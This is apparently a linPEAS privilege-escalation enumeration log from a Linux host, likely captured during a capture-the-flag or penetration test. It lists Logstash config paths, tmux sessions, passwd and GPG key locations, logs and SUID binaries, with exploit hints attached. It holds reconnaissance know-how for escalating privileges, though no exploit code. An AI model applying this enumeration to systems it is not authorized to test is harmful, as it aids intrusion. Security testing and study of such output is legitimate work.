/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-prune-3.0.4/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-ruby-3.1.7/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-sleep-3.0.7/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-split-3.1.8/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-syslog_pri-3.1.0/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-throttle-4.0.4/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-translate-3.3.0/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-truncate-1.0.4/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-urldecode-3.0.6/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-useragent-3.3.1-java/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-useragent-3.3.1-java/vendor/jar-dependencies/org/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-uuid-3.0.5/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-xml-4.1.2/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-azure_event_hubs-1.3.0/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-beats-6.2.0-java/lib/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-beats-6.2.0-java/vendor/jar-dependencies/org/logstash
/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-couchdb_changes-3.1.6/lib/logstashcat: '/etc/default/logstash/conf.d/out*': Not a directory
cat: '/etc/default/logstash/conf.d/filt*': Not a directory
cat: '/etc/logstash/conf.d/out*': No such file or directory
cat: '/etc/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/doc/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/doc/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/bin/logstash/conf.d/out*': Not a directory
cat: '/usr/share/logstash/bin/logstash/conf.d/filt*': Not a directory
cat: '/usr/share/logstash/lib/pluginmanager/templates/codec-plugin/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/lib/pluginmanager/templates/codec-plugin/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/lib/pluginmanager/templates/filter-plugin/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/lib/pluginmanager/templates/filter-plugin/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/lib/pluginmanager/templates/input-plugin/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/lib/pluginmanager/templates/input-plugin/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/lib/pluginmanager/templates/output-plugin/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/lib/pluginmanager/templates/output-plugin/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/logstash-core/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/logstash-core/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/modules/fb_apache/configuration/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/modules/fb_apache/configuration/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/modules/netflow/configuration/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/modules/netflow/configuration/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-avro-3.2.4-java/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-avro-3.2.4-java/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-cef-6.2.3-java/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-cef-6.2.3-java/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-collectd-3.1.0/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-collectd-3.1.0/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-dots-3.0.6/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-dots-3.0.6/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-edn-3.1.0/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-edn-3.1.0/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-edn_lines-3.1.0/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-edn_lines-3.1.0/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-es_bulk-3.0.8/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-es_bulk-3.0.8/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-fluent-3.4.0-java/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-fluent-3.4.0-java/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-graphite-3.0.6/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-graphite-3.0.6/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-json-3.1.0/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-json-3.1.0/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-json_lines-3.1.0/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-json_lines-3.1.0/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-line-3.1.1/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-line-3.1.1/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-msgpack-3.1.0-java/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-msgpack-3.1.0-java/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-multiline-3.1.0/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-multiline-3.1.0/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-netflow-4.2.2/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-netflow-4.2.2/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-plain-3.1.0/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-plain-3.1.0/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-rubydebug-3.1.0/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-codec-rubydebug-3.1.0/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-devutils-1.3.6-java/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-devutils-1.3.6-java/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-aggregate-2.9.2/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-aggregate-2.9.2/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-anonymize-3.0.6/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-anonymize-3.0.6/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-cidr-3.1.3-java/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-cidr-3.1.3-java/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-clone-4.1.1/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-clone-4.1.1/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-csv-3.1.1/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-csv-3.1.1/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-date-3.1.9/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-date-3.1.9/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-date-3.1.9/vendor/jar-dependencies/org/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-date-3.1.9/vendor/jar-dependencies/org/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-de_dot-1.0.4/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-de_dot-1.0.4/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-dissect-1.2.0/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-dissect-1.2.0/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-dissect-1.2.0/vendor/jars/org/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-dissect-1.2.0/vendor/jars/org/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-dns-3.1.4/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-dns-3.1.4/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-drop-3.0.5/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-drop-3.0.5/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-elasticsearch-3.9.4/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-elasticsearch-3.9.4/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-fingerprint-3.3.2/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-fingerprint-3.3.2/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-geoip-7.2.2-java/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-geoip-7.2.2-java/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-geoip-7.2.2-java/vendor/jar-dependencies/org/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-geoip-7.2.2-java/vendor/jar-dependencies/org/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-grok-4.4.0/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-grok-4.4.0/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-http-1.0.2/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-http-1.0.2/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-json-3.2.0/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-json-3.2.0/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-kv-4.5.0/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-kv-4.5.0/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-memcached-1.1.0/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-memcached-1.1.0/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-metrics-4.0.7/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-metrics-4.0.7/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-mutate-3.5.2/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-mutate-3.5.2/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-prune-3.0.4/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-prune-3.0.4/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-ruby-3.1.7/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-ruby-3.1.7/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-sleep-3.0.7/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-sleep-3.0.7/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-split-3.1.8/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-split-3.1.8/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-syslog_pri-3.1.0/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-syslog_pri-3.1.0/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-throttle-4.0.4/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-throttle-4.0.4/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-translate-3.3.0/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-translate-3.3.0/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-truncate-1.0.4/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-truncate-1.0.4/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-urldecode-3.0.6/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-urldecode-3.0.6/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-useragent-3.3.1-java/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-useragent-3.3.1-java/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-useragent-3.3.1-java/vendor/jar-dependencies/org/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-useragent-3.3.1-java/vendor/jar-dependencies/org/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-uuid-3.0.5/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-uuid-3.0.5/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-xml-4.1.2/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-filter-xml-4.1.2/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-azure_event_hubs-1.3.0/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-azure_event_hubs-1.3.0/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-beats-6.2.0-java/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-beats-6.2.0-java/lib/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-beats-6.2.0-java/vendor/jar-dependencies/org/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-beats-6.2.0-java/vendor/jar-dependencies/org/logstash/conf.d/filt*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-couchdb_changes-3.1.6/lib/logstash/conf.d/out*': No such file or directory
cat: '/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-couchdb_changes-3.1.6/lib/logstash/conf.d/filt*': No such file or directory


╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
tmux 2.6


/tmp/tmux-1000
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3704 Sep 20  2021 /etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3559 Apr 20  2021 /snap/core/11316/etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3559 Apr 20  2021 /snap/core/11743/etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 121 Jun 15  2021 /snap/core/11316/usr/share/keyrings
drwxr-xr-x 2 root root 121 Aug 27  2021 /snap/core/11743/usr/share/keyrings
drwxr-xr-x 3 root root 4096 Jul 24  2021 /usr/lib/python3/dist-packages/keyrings
drwxr-xr-x 2 root root 4096 Jul 28  2021 /usr/share/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /snap/core/11316/etc/pam.d/passwd
passwd file: /snap/core/11316/etc/passwd
passwd file: /snap/core/11316/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/11316/var/lib/extrausers/passwd
passwd file: /snap/core/11743/etc/pam.d/passwd
passwd file: /snap/core/11743/etc/passwd
passwd file: /snap/core/11743/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/11743/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 1220 Oct  3  2021 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 2796 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 16295 Jun 15  2021 /snap/core/11316/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 14076 Jun  3  2020 /snap/core/11316/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 Jun  3  2020 /snap/core/11316/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 Jun  3  2020 /snap/core/11316/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 16295 Aug 27  2021 /snap/core/11743/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 14076 Jun  3  2020 /snap/core/11743/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 Jun  3  2020 /snap/core/11743/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 Jun  3  2020 /snap/core/11743/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 3267 Jan 16  2021 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 2274 Jul 27  2021 /usr/share/keyrings/ubuntu-advantage-cis.gpg
-rw-r--r-- 1 root root 2236 Jul 27  2021 /usr/share/keyrings/ubuntu-advantage-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Jul 27  2021 /usr/share/keyrings/ubuntu-advantage-esm-infra-trusty.gpg
-rw-r--r-- 1 root root 2275 Jul 27  2021 /usr/share/keyrings/ubuntu-advantage-fips.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 bill bill 4096 Jan 25 00:37 /home/bill/.gnupg

╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation
-rw-r--r-- 1 root root 342 Sep 16  2021 /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/puma-4.3.8-java/tools/docker/Dockerfile


╔══════════╣ Analyzing Bind Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind


-rw-r--r-- 1 root root 977 Sep 16  2021 /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-patterns-core-4.3.1/patterns/ecs-v1/bind
-rw-r--r-- 1 root root 977 Sep 16  2021 /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-patterns-core-4.3.1/patterns/ecs-v1/bind


-rw-r--r-- 1 root root 285 Sep 16  2021 /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-patterns-core-4.3.1/patterns/legacy/bind
-rw-r--r-- 1 root root 285 Sep 16  2021 /usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-patterns-core-4.3.1/patterns/legacy/bind



╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rw-r----- 1 root adm 0 Oct  4  2021 /var/log/apache2/access.log

-rw-r----- 1 root adm 802 Jan 24 23:40 /var/log/apache2/error.log
-rw-r----- 1 mysql adm 4952 Jan 24 23:40 /var/log/mysql/error.log

╔══════════╣ Analyzing Windows Files (limit 70)






















lrwxrwxrwx 1 root root 22 Jul 24  2021 /etc/alternatives/my.cnf -> /etc/mysql/mariadb.cnf
lrwxrwxrwx 1 root root 24 Jul 24  2021 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 83 Jul 24  2021 /var/lib/dpkg/alternatives/my.cnf



























╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
-rw-r--r-- 1 bill bill 3771 Apr  4  2018 /home/bill/.bashrc
-rw-r--r-- 1 frankie frankie 3771 Jul 25  2021 /home/frankie/.bashrc
-rw-r--r-- 1 princess princess 3771 Oct  3  2021 /home/princess/.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/11316/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/11743/etc/skel/.bashrc





-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 bill bill 807 Apr  4  2018 /home/bill/.profile
-rw-r--r-- 1 frankie frankie 807 Jul 25  2021 /home/frankie/.profile
-rw-r--r-- 1 princess princess 807 Oct  3  2021 /home/princess/.profile
-rw-r--r-- 1 root root 655 Jul 12  2019 /snap/core/11316/etc/skel/.profile
-rw-r--r-- 1 root root 655 Jul 12  2019 /snap/core/11743/etc/skel/.profile



═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
